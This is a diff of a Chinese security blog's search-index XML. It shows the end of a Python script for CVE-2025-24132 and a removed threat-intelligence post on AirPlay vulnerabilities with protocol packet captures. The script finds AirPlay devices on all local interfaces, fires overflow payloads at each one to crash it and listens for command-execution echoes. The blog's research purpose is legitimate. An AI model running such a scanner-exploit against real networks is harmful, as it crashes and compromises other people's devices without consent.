class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_ipv4_interfaces</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用本机所有的IPv4网络接口&quot;&quot;&quot;</span></span><br><span class="line">    addrs = []</span><br><span class="line">    <span class="keyword">for</span> adapter <span class="keyword">in</span> ifaddr.get_adapters():</span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> adapter.ips:</span><br><span class="line">            <span class="keyword">if</span> ip.is_IPv4 <span class="keyword">and</span> <span class="keyword">not</span> ip.ip.startswith(<span class="string">&#x27;127.&#x27;</span>):</span><br><span class="line">                addrs.append(ip.ip)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(addrs))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_airplay_info</span>(<span class="params">ip: <span class="built_in">str</span>, port: <span class="built_in">int</span> = <span class="number">7000</span>, timeout: <span class="built_in">float</span> = <span class="number">2.0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;先PTR扫实例名，再拿TXT，解决硬编码名字对不上的问题&quot;&quot;&quot;</span></span><br><span class="line">    zc = Zeroconf()</span><br><span class="line">    found = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 被动监听2秒，把同一IP的任何 *_airplay._tcp记录都拿到</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Snatcher</span>:</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">add_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">                info = zc.get_service_info(type_, name)</span><br><span class="line">                <span class="keyword">if</span> info <span class="keyword">and</span> socket.inet_ntoa(info.addresses[<span class="number">0</span>]) == ip <span class="keyword">and</span> info.port == port:</span><br><span class="line">                    <span class="keyword">nonlocal</span> found</span><br><span class="line">                    found = info</span><br><span class="line">            remove_service = update_service = <span class="keyword">lambda</span> *_: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        browser = ServiceBrowser(zc, <span class="string">&quot;_airplay._tcp.local.&quot;</span>, Snatcher())</span><br><span class="line">        time.sleep(timeout)</span><br><span class="line">        browser.cancel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: found.name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: found.properties.get(<span class="string">b&#x27;model&#x27;</span>, <span class="string">b&#x27;Unknown&#x27;</span>).decode(),</span><br><span class="line">                <span class="string">&#x27;features&#x27;</span>: <span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(found.properties.get(<span class="string">b&#x27;features&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>), <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        zc.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:                 <span class="comment"># 指定单个目标</span></span><br><span class="line">        ip, port = sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">7000</span></span><br><span class="line">        info = query_airplay_info(ip, port)</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            airplay_devices.append(&#123;**info, <span class="string">&#x27;ip&#x27;</span>: ip, <span class="string">&#x27;port&#x27;</span>: port&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            airplay_devices.append(&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Manual-Target&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: ip, <span class="string">&#x27;port&#x27;</span>: port,</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: <span class="string">&#x27;Unknown&#x27;</span>, <span class="string">&#x27;features&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">else</span>:                                 <span class="comment"># 监听所有网络接口</span></span><br><span class="line">        interfaces = get_all_ipv4_interfaces()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 将在以下接口监听mDNS：&quot;</span>, interfaces)</span><br><span class="line">        zc = Zeroconf(interfaces=interfaces)</span><br><span class="line">        ServiceBrowser(zc, <span class="string">&quot;_airplay._tcp.local.&quot;</span>, AirPlayListener())</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        zc.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> airplay_devices:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 未发现任何AirPlay设备&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> dev <span class="keyword">in</span> airplay_devices:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 设备<span class="subst">&#123;dev[<span class="string">&#x27;name&#x27;</span>]&#125;</span>  <span class="subst">&#123;dev[<span class="string">&#x27;ip&#x27;</span>]&#125;</span>:<span class="subst">&#123;dev[<span class="string">&#x27;port&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    model=<span class="subst">&#123;dev[<span class="string">&#x27;model&#x27;</span>]&#125;</span>  features=0x<span class="subst">&#123;dev[<span class="string">&#x27;features&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_port(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [-] 端口不通，跳过&quot;</span>); <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> heur_vuln(dev[<span class="string">&#x27;model&#x27;</span>], dev[<span class="string">&#x27;features&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [!] 可能使用旧SDK，尝试进行溢出并执行命令&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [!] 版本特征较新，尝试进行溢出并执行命令&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 本地临时监听回显</span></span><br><span class="line">        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        listener.settimeout(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            listener.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, LISTEN_PORT))</span><br><span class="line">            listener.listen(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            listener = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> sz <span class="keyword">in</span> OVERFLOW_SIZES:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [*] 已发送 <span class="subst">&#123;sz&#125;</span>B 溢出载荷&quot;</span>)</span><br><span class="line">            crash_target(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>], sz)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            still_up = check_port(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> still_up:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    [!!!]<span class="subst">&#123;sz&#125;</span>B成功触发崩溃 → 漏洞存在！&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [-] 漏洞可能已修复&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> listener:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                conn, _ = listener.accept()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;CVE-2025-24132&quot;</span> <span class="keyword">in</span> conn.recv(<span class="number">128</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;    [!!!] 同时收到命令回显 → 可利用&quot;</span>)</span><br><span class="line">                conn.close()</span><br><span class="line">            <span class="keyword">except</span> socket.timeout: <span class="keyword">pass</span></span><br><span class="line">            listener.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">           __                                      __             ______   ________   ______  </span></span><br><span class="line"><span class="string">          /  |                                    /  |           /      \\ /        | /      \\ </span></span><br><span class="line"><span class="string">  _______ $$ |____    ______    ______   __    __ $$/  _______  /$$$$$$  |$$$$$$$$/ /$$$$$$  |</span></span><br><span class="line"><span class="string"> /       |$$      \\  /      \\  /      \\ /  \\  /  |/  |/       \\ $$ \\__$$/ $$ |__    $$ |  $$/ </span></span><br><span class="line"><span class="string">/$$$$$$$/ $$$$$$$  | $$$$$$  |/$$$$$$  |$$  \\/$$/ $$ |$$$$$$$  |$$      \\ $$    |   $$ |      </span></span><br><span class="line"><span class="string">$$      \\ $$ |  $$ | /    $$ |$$ |  $$ | $$  $$&lt;  $$ |$$ |  $$ | $$$$$$  |$$$$$/    $$ |   __ </span></span><br><span class="line"><span class="string"> $$$$$$  |$$ |  $$ |/$$$$$$$ |$$ \\__$$ | /$$$$  \\ $$ |$$ |  $$ |/  \\__$$ |$$ |_____ $$ \\__/  |</span></span><br><span class="line"><span class="string">/     $$/ $$ |  $$ |$$    $$ |$$    $$/ /$$/ $$  |$$ |$$ |  $$ |$$    $$/ $$       |$$    $$/ </span></span><br><span class="line"><span class="string">$$$$$$$/  $$/   $$/  $$$$$$$/  $$$$$$/  $$/   $$/ $$/ $$/   $$/  $$$$$$/  $$$$$$$$/  $$$$$$/  </span></span><br><span class="line"><span class="string">                                                                     Detect CVE-2025-24132</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>威胁情报</category>
+      </categories>
+      <tags>
+        <tag>溢出漏洞、RCE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APK安全测试</title>
     <url>/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
@@ -257,716 +413,6 @@
         <tag>Android</tag>
         <tag>APK</tag>
         <tag>Drozer</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2025-24132威胁情报分析</title>
-    <url>/CVE-2025-24132.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
-
-<h1 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h1><blockquote>
-<ol>
-<li>以色列网络安全公司“Oligo”披露了AirPlay协议中存在的一组漏洞，命名为 “AirBorne” 。其中值得关注的有两个：CVE-2025-24132、CVE-2025-24252。</li>
-<li>参考文章<ul>
-<li><a href="https://zhuanlan.zhihu.com/p/683643576">深入解析RTSP协议：流媒体传输的控制核心 - 知乎</a></li>
-<li><a href="https://fingergit.github.io/Unofficial-AirPlay-Protocol-Specification/AirPlay.html">AirPlay协议规范（非官方）</a></li>
-<li><a href="https://wenku.csdn.net/column/159v2uiruj#3.1%20Airplay">https://wenku.csdn.net/column/159v2uiruj#3.1%20Airplay</a></li>
-<li><a href="https://blog.csdn.net/weixin_30481539/article/details/151272328">AirPlay协议源码分析与协议详解-CSDN博客</a></li>
-</ul>
-</li>
-</ol>
-</blockquote>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Airplay是苹果公司推出的一套基于以太网通信的远程音视频播放协议，用来远程播放音频、视屏等等（比如iPhone上的屏幕镜像功能、直播投屏）利用现有的TCP&#x2F;IP协议栈，增加了一些功能，包括从设备的发现 -&gt; 设备连接 -&gt; 音频&#x2F;视频流数据的传输。Airplay协议到目前（2025年）基本上历经了2个版本，在版本一中主要采用RTSP协议相TCP&#x2F;7000传输控制命令，而版本二中，主要采用HTTP协议向TCP&#x2F;7000传递命令；并且，在airplay2.x版本中，加上了TLS等加密和认证的手段，对传递的内容进行到了加密处理。Airpaly的实现采用C&#x2F;S架构，下面以iPhone作为Client、支持Apple TV作为Server进行讲述。</p>
-<table>
-<thead>
-<tr>
-<th>协议</th>
-<th>端口</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>UDP（mDNS&#x2F;Bonjour）</td>
-<td>5353</td>
-<td>发现局域网中的Airplay客户端和服务端</td>
-</tr>
-<tr>
-<td>TCP</td>
-<td>7000</td>
-<td>传输控制相关的命令（RTSP或者HTTP格式）</td>
-</tr>
-<tr>
-<td>TCP</td>
-<td>7100</td>
-<td>传输镜像数据（投屏）</td>
-</tr>
-<tr>
-<td>UDP</td>
-<td>6000&#x2F;6001</td>
-<td>传输RTP音频数据</td>
-</tr>
-</tbody></table>
-<h3 id="通信过程描述"><a href="#通信过程描述" class="headerlink" title="通信过程描述"></a>通信过程描述</h3><ol>
-<li><p>mDNS查询：iPhone利用mDNS(又叫做Bonjour)协议，发现周围支持airplay协议的设备</p>
-<ul>
-<li><p>iPhone通过udp5353端口，向多播地址224.0.0.251发起广播，寻找可用的airplay server</p>
-  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: aa:bb:cc:dd:ee:ff (iPhone)</span><br><span class="line">  目标MAC: 01:00:5E:00:00:FB (组播地址)</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 224.0.0.251 (mDNS组播地址)</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 5353</span><br><span class="line">  目标端口: 5353</span><br><span class="line"></span><br><span class="line">应用层 (mDNS):</span><br><span class="line">  查询类型: PTR</span><br><span class="line">  查询名称: _airplay._tcp.local</span><br><span class="line">  含义: &quot;谁支持 AirPlay 服务？&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>设备进行单播响应（其实airplay server也会不停地向外发起广播，发送自己的设备信息）</p>
-  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: 11:22:33:44:55:66 (Apple TV)</span><br><span class="line">  目标MAC: aa:bb:cc:dd:ee:ff (iPhone)</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.200</span><br><span class="line">  目标IP: 192.168.1.100 (单播回复)</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 5353</span><br><span class="line">  目标端口: 5353</span><br><span class="line"></span><br><span class="line">应用层 (mDNS):</span><br><span class="line">  响应类型: PTR</span><br><span class="line">  服务名称: Living Room Apple TV._airplay._tcp.local</span><br><span class="line">  IP地址: 192.168.1.200</span><br><span class="line">  端口: 7000</span><br><span class="line">  TXT记录: </span><br><span class="line">    - model=AppleTV6,2</span><br><span class="line">    - features=0x4A7FDFD5</span><br><span class="line">    - srcvers=220.68</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>TCP三次握手，Server的7000端口上建立连接（<strong>苹果的协议家族里面，会在TCP&#x2F;7000端口上面交互双方的设备信息&#x2F;控制命令等等，然后在其他端口上面传输实际的通信数据</strong>）</p>
- <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: aa:bb:cc:dd:ee:ff</span><br><span class="line">  目标MAC: 11:22:33:44:55:66</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 192.168.1.200</span><br><span class="line"></span><br><span class="line">TCP层:</span><br><span class="line">  源端口: 54321</span><br><span class="line">  目标端口: 7000</span><br><span class="line">  标志位: SYN</span><br><span class="line">  序列号: 1000</span><br></pre></td></tr></table></figure>
-
- <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TCP层:</span><br><span class="line">  源端口: 7000</span><br><span class="line">  目标端口: 54321</span><br><span class="line">  标志位: SYN+ACK</span><br><span class="line">  序列号: 2000</span><br><span class="line">  确认号: 1001</span><br></pre></td></tr></table></figure>
-
- <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TCP层:</span><br><span class="line">  源端口: 543213  </span><br><span class="line">  目标端口: 70004  </span><br><span class="line">  标志位: ACK5  </span><br><span class="line">  确认号: 2001</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>AirPlay协议握手：用来控制多媒体对话，控制暂停、播放、传输格式等方面。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251120170134581.png" alt="image-20251120170134581"></p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251120165749893.png" alt="image-20251120165749893"></p>
-<ul>
-<li><p>iPhone发起RSTP OPTIONS请求（主要是用来查询Server支持什么样的命令传输方式）</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP连接: 192.168.1.100:54321 → 192.168.1.200:7000</span><br><span class="line"></span><br><span class="line">应用层数据:</span><br><span class="line">OPTIONS * RTSP/1.0</span><br><span class="line">CSeq: 1</span><br><span class="line">User-Agent: AirPlay/220.68</span><br><span class="line">Client-Instance: FBED9A-6539-4E15-B95A-37A6D88</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Apple TV回复RSTP OPTIONS响应</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 1</span><br><span class="line">Public: SETUP, RECORD, PAUSE, FLUSH, TEARDOWN, OPTIONS, </span><br><span class="line">        GET_PARAMETER, SET_PARAMETER, POST, GET</span><br><span class="line">Server: AirTunes/220.68</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>iPhone发起RSTP SETUP，请求建立媒体流</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SETUP rtsp://192.168.1.200/stream RTSP/1.0</span><br><span class="line">CSeq: 2</span><br><span class="line">Transport: RTP/AVP/UDP;unicast;mode=record;control_port=6001;timing_port=6002</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>后续步骤省略……</p>
-</li>
-</ul>
-</li>
-<li><p>传输音频&#x2F;视频的二进制数据</p>
-<ul>
-<li><p>通过RTP传输音频数据</p>
-  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 192.168.1.200</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 随机</span><br><span class="line">  目标端口: 6000</span><br><span class="line"></span><br><span class="line">应用层 (RTP):</span><br><span class="line">  版本: 2</span><br><span class="line">  载荷类型: 96 (动态)</span><br><span class="line">  序列号: 12345</span><br><span class="line">  时间戳: 160000</span><br><span class="line">  同步源标识: 0xABCDEF12</span><br><span class="line">  载荷数据: [AAC编码的音频数据]</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>后续步骤省略……</p>
-</li>
-</ul>
-</li>
-</ol>
-<h3 id="wireshark抓包"><a href="#wireshark抓包" class="headerlink" title="wireshark抓包"></a>wireshark抓包</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">==========================================================</span><br><span class="line">||	Client                                              ||</span><br><span class="line">||		- device: iphone                                ||</span><br><span class="line">||		- ipv4: 172.20.10.1                             ||</span><br><span class="line">||		- MAC: c6:ac:aa:16:d4:64                        ||</span><br><span class="line">||		- ipv6: 2408:8440:b500:a13:e96e:515:63c1:f416   ||</span><br><span class="line">||	                                                    ||</span><br><span class="line">||	Server                                              ||</span><br><span class="line">||		- device: Airserver for windows 5.7.2.0         ||</span><br><span class="line">||		- ipv4: 172.20.10.6                             ||</span><br><span class="line">||		- MAC: e0:0a:f6:a6:48:c7                        ||</span><br><span class="line">||		- ipv6: 2408:8440:b500:a13:94d9:8df9:f144:e718  || </span><br><span class="line">==========================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= mDNS查询 =======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= TCP三次握手 =======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server ======================= </span><br><span class="line">GET /info RTSP/1.0</span><br><span class="line">X-Apple-ProtocolVersion: 1</span><br><span class="line">Content-Length: 70</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 0</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00YqualifierZtxtAirPlay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone ======================= </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 21 Nov 2025 09:20:01 GMT</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 210</span><br><span class="line"></span><br><span class="line">bplist00</span><br><span class="line">	</span><br><span class="line">_E1:0A:F6:A6:48:C7XdeviceIDR&#125;_XfeaturesQ4[statusFlagsZAppleTV3,2UmodelQ2RvvV220.68]sourceVersionSAPTTname_audioInputFormats/8=FHT_egjqpdateC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server ======================= </span><br><span class="line">POST /fp-setup RTSP/1.0</span><br><span class="line">X-Apple-ET: 32</span><br><span class="line">Content-Length: 16</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 1</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">FPLY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 1</span><br><span class="line">Content-Length: 142</span><br><span class="line"></span><br><span class="line">FPLYqA</span><br><span class="line">e&#x27;sQhw-?&gt;INNO`Lnz@IM8Rec$Xn]\cZcdG</span><br><span class="line">Xy-2Sh;g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">POST /fp-setup RTSP/1.0</span><br><span class="line">X-Apple-ET: 32</span><br><span class="line">Content-Length: 164</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 2</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">FPLY$e2(&#125;^g=4W;2As]A2yT0 K(UUHVK4XL</span><br><span class="line">=m	LV7-@mQv&amp;~+/3c),QKg2Zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 2</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">FPLY),QKg2Zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">SETUP rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 658</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 3</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00	</span><br><span class="line"></span><br><span class="line"> !&quot;#$Ret_updateSessionRequestSeiv[sessionUUID_statsCollectionEnabledVosName^timingProtocol^osBuildVersion]sourceVersionZtimingPort_isScreenMirroringSessionYosVersionTekey_sessionCorrelationUUIDXdeviceIDUmodelTnameZmacAddress O~jHyfgd&#x27;_$CCE84329-32C7-4825-842A-F352FA3554C9YiPhone OSSNTPX23C5027fW925.3.2O	T26.2OHFPLY&lt; NV&#x27;YbbIx;5RQP_$41C6E7A1-FC63-49CE-884A-A1AB9358308E_BA:7E:91:22:2A:CBZiPhone15,3e^eO`i_C6:AC:AA:16:D4:64/2IMYry(OPZ^gorsx	%(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 77</span><br><span class="line">CSeq: 3</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00YeventPort|ZtimingPort</span><br><span class="line">:Th(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">GET /info RTSP/1.0</span><br><span class="line">X-Apple-ProtocolVersion: 1</span><br><span class="line">CSeq: 4</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 821</span><br><span class="line">CSeq: 4</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00#$&amp;()+-.0:&lt;=%&#x27;</span><br><span class="line">*,</span><br><span class="line">/1;/R&#125;_XfeaturesSAPTTname	</span><br><span class="line">Xdisplays]widthPhysical	XrotationUwidth[widthPixels^heightPhysical8Vheight[overscanned\heightPixels_$4DA963C0-AA8F-4462-8EA9-694BC8B927C4Tuuid!dTtype_audioInputFormats_audioOutputFormats e&quot;f\audioFormatsRpiRvv[statusFlags_keepAliveLowPowerV220.68]sourceVersion_@355ce7d9bda3a97b18b91754287a2b26a680d64a56239a6ba8f813dd26415cc0Rpk_keepAliveSendStatsAsBody_E0:0A:F6:A6:48:C7XdeviceID2783564_outputLatencyMicrosWdefaultYaudioType_inputLatencyMicros356 4356&quot;9Umedia^audioLatenciesZAppleTV3,2UmodelZmacAddress).7;@BW`bpqz&#125;079@BORTWYey/7AV_hn&#125;:Th&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">GET_PARAMETER rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 8</span><br><span class="line">Content-Type: text/parameters</span><br><span class="line">CSeq: 5</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">volume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 5</span><br><span class="line">Content-Type: text/parameters</span><br><span class="line">Content-Length: 19</span><br><span class="line"></span><br><span class="line">volume: -0.000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">RECORD rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">CSeq: 6</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Audio-Latency: 0</span><br><span class="line">Server: 